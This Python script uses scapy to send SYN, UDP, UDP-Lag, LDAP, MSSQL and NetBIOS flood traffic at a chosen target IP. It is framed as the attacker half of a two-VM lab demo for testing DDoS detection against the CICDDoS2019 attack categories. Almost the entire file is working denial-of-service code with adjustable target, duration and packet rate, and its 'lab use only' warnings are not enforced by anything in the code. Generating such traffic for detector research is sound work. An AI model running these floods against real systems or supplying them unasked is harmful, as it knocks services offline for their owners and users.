#!/usr/bin/env python3
"""
ddos_traffic_generator.py - Traffic generator for 2-VM DDoS detection demo.

Generates different types of network traffic matching the 6 DDoS attack
categories in the CICDDoS2019 dataset, plus benign traffic. Designed to
run on the ATTACKER VM targeting the VICTIM VM where live_ips.py is
running.

This script is intended for CONTROLLED LAB ENVIRONMENTS ONLY.
Only use it between VMs on an isolated virtual network.

Usage:
    sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack syn_flood
    sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack all --duration 30
    sudo python3 tools/ddos_traffic_generator.py --list

Attack types:
    benign       - Normal HTTP/ICMP traffic
    syn_flood    - TCP SYN Flood
    udp_flood    - UDP Flood
    udp_lag      - UDP-Lag Flood (large payloads)
    ldap_flood   - LDAP amplification-style traffic
    mssql_flood  - MSSQL amplification-style traffic
    netbios_flood- NetBIOS amplification-style traffic
    all          - Run all attacks sequentially

Requirements:
    pip install scapy
    Must run as root/sudo (raw socket access)
"""

from __future__ import annotations

import argparse
import logging
import os
import random
import sys
import time

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger("ddos_traffic_generator")

try:
    from scapy.all import (
        IP,
        TCP,
        UDP,
        ICMP,
        Raw,
        RandShort,
        send,
    )
except ImportError:
    logger.error("Scapy not installed. Install: pip install scapy")
    sys.exit(1)


ATTACK_DESCRIPTIONS = {
    "benign": "Normal HTTP GET/ICMP ping traffic",
    "syn_flood": "TCP SYN Flood — mass SYN packets to exhaust connection table",
    "udp_flood": "UDP Flood — high-rate small UDP packets to saturate bandwidth",
    "udp_lag": "UDP-Lag Flood — large UDP payloads causing processing delay",
    "ldap_flood": "LDAP amplification-style — UDP port 389 with LDAP-like payloads",
    "mssql_flood": "MSSQL amplification-style — UDP port 1434 with MSSQL-like payloads",
    "netbios_flood": "NetBIOS amplification-style — UDP port 137 with NetBIOS-like payloads",
}


def _check_root() -> None:
    if os.geteuid() != 0:
        logger.error("This script requires root privileges. Run with sudo.")
        sys.exit(1)


def generate_benign(target: str, duration: float, pps: int) -> None:
    """Generate normal HTTP and ICMP traffic."""
    logger.info(f"Generating benign traffic to {target} for {duration}s")
    end_time = time.time() + duration
    count = 0
    delay = 1.0 / max(pps, 1)

    while time.time() < end_time:
        # HTTP GET (TCP port 80)
        pkt = IP(dst=target) / TCP(
            sport=RandShort(),
            dport=80,
            flags="S",
        )
        send(pkt, verbose=False)
        count += 1

        # ICMP ping
        pkt = IP(dst=target) / ICMP()
        send(pkt, verbose=False)
        count += 1

        # DNS query (UDP port 53, small payload)
        pkt = IP(dst=target) / UDP(
            sport=RandShort(),
            dport=53,
        ) / Raw(load=b"\x00" * 32)
        send(pkt, verbose=False)
        count += 1

        time.sleep(delay)

    logger.info(f"Benign traffic done: {count} packets sent")


def generate_syn_flood(target: str, duration: float, pps: int) -> None:
    """TCP SYN Flood — send SYN packets with random source ports."""
    logger.info(f"SYN Flood to {target}:{80} for {duration}s at ~{pps} pps")
    end_time = time.time() + duration
    count = 0
    delay = 1.0 / max(pps, 1)

    while time.time() < end_time:
        pkt = IP(dst=target) / TCP(
            sport=RandShort(),
            dport=80,
            flags="S",
            seq=random.randint(0, 2**32 - 1),
        )
        send(pkt, verbose=False)
        count += 1
        time.sleep(delay)

    logger.info(f"SYN Flood done: {count} packets sent")


def generate_udp_flood(target: str, duration: float, pps: int) -> None:
    """UDP Flood — high-rate small UDP packets."""
    logger.info(f"UDP Flood to {target} for {duration}s at ~{pps} pps")
    end_time = time.time() + duration
    count = 0
    delay = 1.0 / max(pps, 1)
    payload = os.urandom(64)

    while time.time() < end_time:
        pkt = IP(dst=target) / UDP(
            sport=RandShort(),
            dport=random.randint(1, 65535),
        ) / Raw(load=payload)
        send(pkt, verbose=False)
        count += 1
        time.sleep(delay)

    logger.info(f"UDP Flood done: {count} packets sent")


def generate_udp_lag(target: str, duration: float, pps: int) -> None:
    """UDP-Lag Flood — large UDP payloads causing processing delay."""
    logger.info(f"UDP-Lag Flood to {target} for {duration}s at ~{pps} pps")
    end_time = time.time() + duration
    count = 0
    delay = 1.0 / max(pps, 1)
    payload = os.urandom(1400)

    while time.time() < end_time:
        pkt = IP(dst=target) / UDP(
            sport=RandShort(),
            dport=random.randint(1, 65535),
        ) / Raw(load=payload)
        send(pkt, verbose=False)
        count += 1
        time.sleep(delay)

    logger.info(f"UDP-Lag Flood done: {count} packets sent")


def generate_ldap_flood(target: str, duration: float, pps: int) -> None:
    """LDAP amplification-style — UDP port 389."""
    logger.info(f"LDAP Flood to {target}:389 for {duration}s at ~{pps} pps")
    end_time = time.time() + duration
    count = 0
    delay = 1.0 / max(pps, 1)
    # LDAP search request pattern (simplified)
    ldap_payload = (
        b"\x30\x84\x00\x00\x00\x2d"
        b"\x02\x01\x01"
        b"\x63\x84\x00\x00\x00\x24"
        b"\x04\x00"
        b"\x0a\x01\x02"
        b"\x0a\x01\x00"
        b"\x02\x01\x00"
        b"\x02\x01\x00"
        b"\x01\x01\x00"
        b"\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73"
        b"\x30\x00"
    )

    while time.time() < end_time:
        pkt = IP(dst=target) / UDP(
            sport=RandShort(),
            dport=389,
        ) / Raw(load=ldap_payload)
        send(pkt, verbose=False)
        count += 1
        time.sleep(delay)

    logger.info(f"LDAP Flood done: {count} packets sent")


def generate_mssql_flood(target: str, duration: float, pps: int) -> None:
    """MSSQL amplification-style — UDP port 1434."""
    logger.info(f"MSSQL Flood to {target}:1434 for {duration}s at ~{pps} pps")
    end_time = time.time() + duration
    count = 0
    delay = 1.0 / max(pps, 1)
    # MSSQL Browser service probe
    mssql_payload = b"\x02" + os.urandom(100)

    while time.time() < end_time:
        pkt = IP(dst=target) / UDP(
            sport=RandShort(),
            dport=1434,
        ) / Raw(load=mssql_payload)
        send(pkt, verbose=False)
        count += 1
        time.sleep(delay)

    logger.info(f"MSSQL Flood done: {count} packets sent")


def generate_netbios_flood(target: str, duration: float, pps: int) -> None:
    """NetBIOS amplification-style — UDP port 137."""
    logger.info(f"NetBIOS Flood to {target}:137 for {duration}s at ~{pps} pps")
    end_time = time.time() + duration
    count = 0
    delay = 1.0 / max(pps, 1)
    # NetBIOS Name Service query pattern
    netbios_payload = (
        b"\x80\x94\x00\x00\x00\x01\x00\x00"
        b"\x00\x00\x00\x00"
        b"\x20\x43\x4b\x41\x41\x41\x41\x41"
        b"\x41\x41\x41\x41\x41\x41\x41\x41"
        b"\x41\x41\x41\x41\x41\x41\x41\x41"
        b"\x41\x41\x41\x41\x41\x41\x41\x41"
        b"\x41\x00\x00\x21\x00\x01"
    )

    while time.time() < end_time:
        pkt = IP(dst=target) / UDP(
            sport=RandShort(),
            dport=137,
        ) / Raw(load=netbios_payload)
        send(pkt, verbose=False)
        count += 1
        time.sleep(delay)

    logger.info(f"NetBIOS Flood done: {count} packets sent")


ATTACK_GENERATORS = {
    "benign": generate_benign,
    "syn_flood": generate_syn_flood,
    "udp_flood": generate_udp_flood,
    "udp_lag": generate_udp_lag,
    "ldap_flood": generate_ldap_flood,
    "mssql_flood": generate_mssql_flood,
    "netbios_flood": generate_netbios_flood,
}


def run_all_attacks(target: str, duration: float, pps: int) -> None:
    """Run all attack types sequentially with benign traffic between them."""
    attacks = ["benign", "syn_flood", "udp_flood", "udp_lag",
               "ldap_flood", "mssql_flood", "netbios_flood"]

    per_attack_duration = duration / len(attacks)
    logger.info(
        f"Running all {len(attacks)} attack types, "
        f"{per_attack_duration:.0f}s each, total {duration:.0f}s"
    )

    for i, attack in enumerate(attacks):
        logger.info(f"\n{'='*60}")
        logger.info(f"Phase {i+1}/{len(attacks)}: {attack}")
        logger.info(f"{'='*60}")
        ATTACK_GENERATORS[attack](target, per_attack_duration, pps)
        if i < len(attacks) - 1:
            logger.info("Pausing 2s between phases...")
            time.sleep(2)

    logger.info("All attack phases completed.")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="DDoS traffic generator for 2-VM detection demo (LAB USE ONLY)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "WARNING: This tool is for controlled lab environments only.\n"
            "Only use between VMs on an isolated virtual network.\n"
            "Unauthorized use against real networks is illegal.\n\n"
            "Examples:\n"
            "  sudo python3 tools/ddos_traffic_generator.py --target 192.168.56.102 --attack syn_flood\n"
            "  sudo python3 tools/ddos_traffic_generator.py --target 192.168.56.102 --attack all -d 60\n"
            "  sudo python3 tools/ddos_traffic_generator.py --list\n"
        ),
    )
    parser.add_argument("--target", "-t", type=str,
                        help="Victim VM IP address")
    parser.add_argument("--attack", "-a", type=str,
                        choices=list(ATTACK_GENERATORS.keys()) + ["all"],
                        help="Attack type to generate")
    parser.add_argument("--duration", "-d", type=float, default=30,
                        help="Duration in seconds (default: 30)")
    parser.add_argument("--pps", type=int, default=100,
                        help="Approximate packets per second (default: 100)")
    parser.add_argument("--list", action="store_true",
                        help="List available attack types and exit")

    args = parser.parse_args()

    if args.list:
        print("\nAvailable attack types:\n")
        for name, desc in ATTACK_DESCRIPTIONS.items():
            print(f"  {name:16s} {desc}")
        print(f"\n  {'all':16s} Run all attacks sequentially\n")
        return

    if not args.target:
        parser.error("--target is required (victim VM IP)")
    if not args.attack:
        parser.error("--attack is required (attack type)")

    _check_root()

    logger.warning("=" * 60)
    logger.warning("  DDoS TRAFFIC GENERATOR — LAB USE ONLY")
    logger.warning(f"  Target: {args.target}")
    logger.warning(f"  Attack: {args.attack}")
    logger.warning(f"  Duration: {args.duration}s, PPS: {args.pps}")
    logger.warning("=" * 60)

    if args.attack == "all":
        run_all_attacks(args.target, args.duration, args.pps)
    else:
        ATTACK_GENERATORS[args.attack](args.target, args.duration, args.pps)


if __name__ == "__main__":
    main()
